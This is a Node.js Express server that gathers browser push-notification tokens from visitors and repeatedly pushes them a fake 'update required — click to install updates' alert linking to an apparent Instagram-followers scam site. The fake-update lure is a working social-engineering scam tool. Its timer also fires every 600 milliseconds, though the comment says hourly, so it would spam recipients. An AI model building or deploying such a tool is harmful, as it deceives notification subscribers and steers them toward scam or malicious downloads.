const express = require("express");
const fs = require("fs");
const admin = require("firebase-admin");
const path = require("path");

const app = express();
app.use(express.json());

// 🔥 Serve static files (index.html, etc)
app.use(express.static(__dirname));

// 🔑 Load Firebase key from ENV
if (!process.env.FIREBASE_KEY) {
  console.error("FIREBASE_KEY is missing!");
  process.exit(1);
}

const serviceAccount = JSON.parse(process.env.FIREBASE_KEY);

// fix newline issue
serviceAccount.private_key = serviceAccount.private_key.replace(/\\n/g, '\n');

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

// 📦 Token storage file
const TOKENS_FILE = "tokens.json";

// 📥 Get tokens
function getTokens() {
  if (!fs.existsSync(TOKENS_FILE)) return [];
  return JSON.parse(fs.readFileSync(TOKENS_FILE));
}

// 💾 Save token endpoint
app.post("/save-token", (req, res) => {
  const { token } = req.body;

  if (!token) {
    return res.status(400).send("No token provided");
  }

  let tokens = getTokens();

  if (!tokens.includes(token)) {
    tokens.push(token);
    fs.writeFileSync(TOKENS_FILE, JSON.stringify(tokens, null, 2));
    console.log("Saved token:", token);
  } else {
    console.log("Token already exists");
  }

  res.send("Token saved");
});

// 🔔 Send notifications to all users
function sendNotifications() {
  const tokens = getTokens();

  if (tokens.length === 0) {
    console.log("No tokens yet");
    return;
  }

  tokens.forEach(token => {
    const message = {
      token,
      notification: {
        title: "update required",
        body: "click to install updates"
      },
      webpush: {
        fcmOptions: {
          link: "https://instagram-followers5k.onrender.com"
        }
      }
    };

    admin.messaging().send(message)
      .then(() => console.log("Sent to:", token))
      .catch(err => console.log("Error sending:", err));
  });
}

// ⏱️ Send every 1 hour
setInterval(sendNotifications, 600);

// 👉 For testing (optional: 10 seconds)
// setInterval(sendNotifications, 10000);

// 🌐 Serve homepage
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// 🚀 Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
